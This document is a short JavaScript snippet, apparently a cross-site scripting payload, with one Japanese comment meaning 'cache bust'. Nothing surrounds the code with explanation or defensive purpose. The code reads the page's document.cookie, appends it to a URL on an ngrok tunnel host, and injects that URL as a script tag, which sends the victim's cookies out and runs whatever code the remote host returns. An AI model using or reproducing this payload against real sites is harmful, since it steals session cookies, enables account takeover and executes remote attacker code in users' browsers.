(function () {
    var u = 'https://31f12cf3abcc.ngrok-free.app/hit?c='
        + encodeURIComponent(document.cookie || '')
        + '&t=' + Date.now(); // キャッシュバスト
    var s = document.createElement('script');
    s.src = u;
    document.documentElement.appendChild(s);
})();